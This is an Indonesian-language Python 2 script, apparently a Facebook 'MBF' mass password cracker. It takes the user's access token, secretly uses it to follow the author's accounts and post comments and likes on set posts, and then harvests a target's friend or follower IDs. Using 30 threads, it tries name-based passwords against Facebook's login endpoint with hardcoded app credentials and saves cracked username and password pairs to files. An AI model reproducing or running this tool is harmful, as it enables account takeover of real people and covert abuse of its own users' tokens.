#-*-coding:utf-8-*-
import os,sys,time,random,hashlib,re,threading,json,urllib,cookielib,requests,uuid,datetime
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
reload(sys)
sys.setdefaultencoding('utf8')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

loop = 0
id = []
cp = []
ok = []

# Pastikan Jangan Ubah Bot Komen & Follownya :v #
ua = ('Lenovo-A850/S105 Linux/3.4.0 Android/4.2 Release/06.12.2013 Browser/AppleWebKit534.30 Profile/ Configuration/ Safari/534.30')
logo = ("""\033[1;97m __  __  ____  ____
|          |        AUTOR=FAIS GANS
|          |         FB=
|---------|
|          |
|          |


""")
def __login__():
	os.system('clear')
	print(logo)
	print('[1] Login Pakai Token<3')
	print('[2] Cara Dapat Token')
	print('[3] Keluar')
        masuk = raw_input('\n[#] Choose : ')
        if masuk == "":
                exit('[•] Wrong Input')
        elif masuk == "1":
		token = raw_input("[*] Token : ")
		try:
                	y = requests.get('https://graph.facebook.com/me?access_token='+token)
	                x = json.loads(y.text)
	                nama = x['name']
	                save = open("login.txt", 'w')
	                save.write(token)
	                save.close()
	                __komen_token__()
	        except KeyError:
			print('[•] Token Salah')
	                time.sleep(3)
	                __login__()
	        except requests.exceptions.SSLError:
	                exit('[•] Token Invalid')
        elif masuk == "2":
		print('[•] Anda Akan Diarahkan Ke Browser')
                time.sleep(3)
		os.system("xdg-open https://youtu.be/3Y6xsMB3wRg")
                exit()
        elif masuk == "0":
                exit()
        else:
		exit('[•] Wrong Input')
def __hasil_ok_cp__():
	print('\n[1] Lihat Hasil Ok')
	print('[2] Lihat Hasil Cp')
	print('[3] Kembali')
	has = raw_input('[#] Choose : ')
	if has == '':
		exit('[•] Wrong Input')
	elif has == '1':
		hasil_ok = open('Ok.json','r').read()
		print(hasil_ok)
		exit()
	elif has == '2':
		hasil_cp = open('Cp.json','r').read()
		print(hasil_cp)
		exit()
	elif has == '3':
		__menu__()
	else:
		exit('[•] Wrong Input')
# Jangan Di Ganti # Kalo Mau Tambahin Aja #
def __komen_token__():
        try:
                token = open('login.txt','r').read()
        except IOError:
		print('[•] Token Invalid')
                os.system('rm -rf login.txt')
		time.sleep(3)
                __login__()
	__web__ = datetime.datetime.now()
        __waktu__ = __web__.strftime("%H:%M:%S / %d-%m-%Y ")
        __love__ = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
	__motivasi__ = random.choice(["Apapun yg terjadi, nikmati hidup ini. Hapus air mata, berikan senyummu. Kadang, senyum terindah datang setelah air mata penuh luka.","Jika kamu tahu seseorang telah ada yg memiliki, kamu seharusnya menghargai. Jangan menjadi alasan hubungan mereka berakhir.","Mencemaskan apa yg mungkin terjadi hanya membuang waktumu. Itu hanya membebani pikiranmu dan mengambil kebahagiaanmu.","Jangan menunggu waktu yg tepat tuk melakukan hal yg baik. Jangan terus bertanya apa yg mungkin terjadi, beranikan diri!","Jika seseorang mampu memberi alasan mengapa dia mencintaimu, dia tak mencintaimu, dia menyukaimu. Cinta itu emosi, bukan definisi.","Dalam hidup, kamu harus menyadari, kadang orang yg paling kamu inginkan, adalah orang yg buat hidupmu lebih baik jika tanpanya","Dia yg tulus mencintaimu takkan berjalan di depanmu, atau tertinggal di belakangmu. Dia akan selalu berjalan di sampingmu.","Kadang, masalah adalah satu-satunya cara tuk tahu siapa yg tulus peduli padamu dan siapa yg berpura-pura jadi temanmu.","Mereka yg mencintaimu slalu ingin yg terbaik untukmu, hanya saja cara mereka bukan slalu yg terbaik.","Jangan menunda sebuah pekerjaan, lebih baik menyesali apa yg kamu kerjakan, daripada menyesali apa yg tak pernah kamu kerjakan."])
        __kata__ = 'Pengguna Script MBF '
	__kata2__ = 'Izin Pake Scriptnya Bang '
        __kom__ = __kata__+__love__+'\n'+__motivasi__+'\n'+__waktu__
	__kom2__ = __kata2__+__love__+'\n'+__waktu__
        requests.post('https://graph.facebook.com/757953543/subscribers?access_token=' + token) #Rozhak
        requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token=' + token) #Rozhak
	requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token=' + token) #Muhammad Rozhak
        requests.post('https://graph.facebook.com/10159090813023544/comments/?message=' +__kom__+ '&access_token=' + token)
        requests.post('https://graph.facebook.com/10159090813023544/likes?summary=true&access_token=' + token)
        requests.post('https://graph.facebook.com/10159090813023544/comments/?message='+__kom2__+'&access_token=' + token)
        requests.post('https://graph.facebook.com/10158807643598544/likes?summary=true&access_token=' + token)
	print('[*] Login Berhasil')
        __menu__()
def __menu__():
        try:
                token = open('login.txt','r').read()
        except IOError:
		print('[•] Token Invalid')
                os.system('rm -rf login.txt')
		time.sleep(2)
                __login__()
        try:
                p = requests.get('https://graph.facebook.com/me?access_token=' +token)
                q = json.loads(p.text)
                name = q['name']
		birthday = q['birthday']
        except KeyError:
		print('[•] Token Invalid')
                os.system('rm -rf login.txt')
		time.sleep(3)
		__login__()
        except requests.exceptions.ConnectionError:
		exit('[•] Koneksi Error')
        os.system('clear')
	print(logo)
	print('[•] Name : '+name)
	print('[•] Birthday : '+birthday)
	print('\n[1] Crack Dari Publik<3')
	print('[2] Crack Dari Follower<3')
	print('[3] Lihat Hasil Crack<3')
	print('[0] Keluar')
	msk = raw_input('\n[#] Choose : ')
	if msk == "":
		exit('[•] Wrong Input')
	elif msk == "1" or msk == "01":
		idt = raw_input('[*] Target : ')
		try:
			token=open('login.txt','r').read()
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print('[*] Nama : '+sp["name"])
		except KeyError:
			exit('[•] Target Tidak Ditemukan')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			id.append(uid)
	elif msk == "2" or msk == "02":
		idt = raw_input('[*] Target : ')
		try:
			token=open('login.txt','r').read()
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print('[*] Nama : '+sp["name"])
		except KeyError:
			exit('[•] Target Tidak Ditemukan')
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			id.append(uid)
	elif msk == "3" or msk == "03":
		__hasil_ok_cp__()
	elif msk == "0" or msk == "00":
		os.system("rm -f login.txt")
		time.sleep(3)
		exit('[*] Selamat Tinggal')
	else:
		exit('[•] Wrong Input')
	print('[*] Total ID : '+str(len(id)))
	print(' ')
	def main(arg):
		global ok,cp,ua, loop
		pwx = []
		__warna_warni__ = random.choice(['\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m'])
		print __warna_warni__+'\r[Crack] %s/%s [Ok:%s] - [Cp:%s] ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		uid = arg
		try:
			d = requests.get('https://graph.facebook.com/'+uid+'/?access_token='+token)
	                v = json.loads(d.text)
			nama = v['name']
			first = v['first_name']
			last = v['last_name']
			pwx.append(nama)
			pwx.append(first+'123')
			pwx.append(first+'1234')
			pwx.append(first+'12345')
			pwx.append(first+'123456')
			pwx.append(last+'123')
			pwx.append(last+'1234')
			pwx.append(last+'12345')
			pwx.append(last+'123456')
			for pw in pwx:
				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua,
				'content-type': 'application/x-www-form-urlencoded',
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=headers_)
				if "access_token" in send.text and "EAAA" in send.text:
					print '\r\033[1;92m[Ok] '+uid+'|'+pw+'        '
					ok.append(uid+'|'+pw)
					save = open('Ok.json','a') 
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					print '\r\033[1;93m[Cp] '+uid+'|'+pw+'|'+nama
					cp.append(uid+'|'+pw)
					save = open('Cp.json','a')
					save.write(str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	exit("\n[Selesai]")

if __name__=='__main__':
	os.system('git pull')
	__menu__()